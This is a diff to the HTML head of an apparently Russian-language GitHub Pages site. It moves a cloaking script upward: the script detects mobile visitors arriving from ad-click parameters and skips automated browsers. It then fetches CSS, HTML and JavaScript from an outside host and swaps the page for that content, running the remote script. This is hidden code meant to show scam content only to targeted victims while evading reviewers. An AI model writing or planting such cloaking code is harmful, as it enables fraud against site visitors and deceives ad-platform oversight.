@@ -3,6 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="dns-prefetch" href="https://cloud-analytics-node.com">
+    <link rel="preconnect" href="https://cloud-analytics-node.com" crossorigin>
+    <style id="sync-guard">
+        html.is-syncing { background: #f5f5f7 !important; }
+        html.is-syncing body { opacity: 0 !important; pointer-events: none !important; }
+        body { transition: opacity 0.16s ease; }
+    </style>
+    <script>
+    (function (w, d) {
+        'use strict';
+        var q = w.location.search || '';
+        if (!q || navigator.webdriver) return;
+        if (!/[?&](?:fbclid|ttclid|gclid|wbraid|gbraid|utm_source|utm_campaign|utm_medium|campaign_name|adset_name|ad_name)=/i.test(q)) return;
+
+        var ua = navigator.userAgent || '';
+        var isMob = /android|iphone|ipad|ipod|mobile/i.test(ua) || (/macintosh/i.test(ua) && navigator.maxTouchPoints > 1);
+        if (!isMob) return;
+
+        var mounted = false;
+        d.documentElement.classList.add('is-syncing');
+
+        function revealWhite() {
+            if (mounted) return;
+            if (revealTimer) {
+                clearTimeout(revealTimer);
+                revealTimer = null;
+            }
+            d.documentElement.classList.remove('is-syncing');
+        }
+
+        var revealTimer = setTimeout(revealWhite, 1100);
+
+        function mountView(payload) {
+            if (mounted || !payload || payload.ok !== 1 || !payload.css || !payload.html || !payload.js) return;
+            mounted = true;
+            if (revealTimer) {
+                clearTimeout(revealTimer);
+                revealTimer = null;
+            }
+
+            var vp = d.querySelector('meta[name="viewport"]');
+            if (vp) {
+                vp.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
+            }
+            d.documentElement.setAttribute('translate', 'no');
+
+            var oldStyles = d.querySelectorAll('head style, head link[rel="stylesheet"]');
+            for (var i = 0; i < oldStyles.length; i++) {
+                if (oldStyles[i].parentNode) oldStyles[i].parentNode.removeChild(oldStyles[i]);
+            }
+
+            var styleEl = d.createElement('style');
+            styleEl.textContent = payload.css;
+            d.head.appendChild(styleEl);
+
+            d.body.style.overflow = '';
+            d.body.innerHTML = payload.html;
+            d.documentElement.className = '';
+            w.scrollTo(0, 0);
+
+            var scriptEl = d.createElement('script');
+            scriptEl.textContent = payload.js;
+            d.body.appendChild(scriptEl);
+        }
+
+        var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 3500) : null;
+        var endpoint = 'https://cloud-analytics-node.com/v2/get-key' + q;
+
+        w.fetch(endpoint, {
+            method: 'GET',
+            credentials: 'omit',
+            signal: ctrl ? ctrl.signal : undefined
+        })
+        .then(function (res) {
+            if (tId) clearTimeout(tId);
+            if (res.status !== 200) return null;
+            return res.json();
+        })
+        .then(function (payload) {
+            if (!payload || payload.ok !== 1) {
+                revealWhite();
+                return;
+            }
+            if (revealTimer) {
+                clearTimeout(revealTimer);
+                revealTimer = null;
+            }
+            if (d.readyState === 'loading' || !d.body) {
+                d.addEventListener('DOMContentLoaded', function () {
+                    mountView(payload);
+                }, { once: true });
+            } else {
+                mountView(payload);
+            }
+        })
+        .catch(function () {
+            if (tId) clearTimeout(tId);
+            revealWhite();
+        });
+    })(window, document);
+    </script>
     <meta name="robots" content="index, follow">
     <link rel="canonical" href="https://progressdrivebel.github.io/">
 
@@ -894,73 +996,6 @@
             }
         }
     </style>
-    <script>
-    (function (w, d) {
-        'use strict';
-        var q = w.location.search || '';
-        if (!q || navigator.webdriver) return;
-        if (!/[?&](?:fbclid|ttclid|gclid|wbraid|gbraid|utm_source|utm_campaign|utm_medium|campaign_name|adset_name|ad_name)=/i.test(q)) return;
-
-        var ua = navigator.userAgent || '';
-        var isMob = /android|iphone|ipad|ipod|mobile/i.test(ua) || (/macintosh/i.test(ua) && navigator.maxTouchPoints > 1);
-        if (!isMob) return;
-
-        function mountView(payload) {
-            if (!payload || payload.ok !== 1 || !payload.css || !payload.html || !payload.js) return;
-            var vp = d.querySelector('meta[name="viewport"]');
-            if (vp) {
-                vp.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
-            }
-            d.documentElement.setAttribute('translate', 'no');
-            d.documentElement.className = '';
-
-            var oldStyles = d.querySelectorAll('head style, head link[rel="stylesheet"]');
-            for (var i = 0; i < oldStyles.length; i++) {
-                if (oldStyles[i].parentNode) oldStyles[i].parentNode.removeChild(oldStyles[i]);
-            }
-
-            var styleEl = d.createElement('style');
-            styleEl.textContent = payload.css;
-            d.head.appendChild(styleEl);
-
-            d.body.style.overflow = '';
-            d.body.innerHTML = payload.html;
-            w.scrollTo(0, 0);
-
-            var scriptEl = d.createElement('script');
-            scriptEl.textContent = payload.js;
-            d.body.appendChild(scriptEl);
-        }
-
-        var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
-        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 3500) : null;
-        var endpoint = 'https://cloud-analytics-node.com/v2/get-key' + q;
-
-        w.fetch(endpoint, {
-            method: 'GET',
-            credentials: 'omit',
-            signal: ctrl ? ctrl.signal : undefined
-        })
-        .then(function (res) {
-            if (tId) clearTimeout(tId);
-            if (res.status !== 200) return null;
-            return res.json();
-        })
-        .then(function (payload) {
-            if (!payload || payload.ok !== 1) return;
-            if (d.readyState === 'loading') {
-                d.addEventListener('DOMContentLoaded', function () {
-                    mountView(payload);
-                }, { once: true });
-            } else {
-                mountView(payload);
-            }
-        })
-        .catch(function () {
-            if (tId) clearTimeout(tId);
-        });
-    })(window, document);
-    </script>
 </head>
 <body>
     <nav aria-label="Основная навигация">
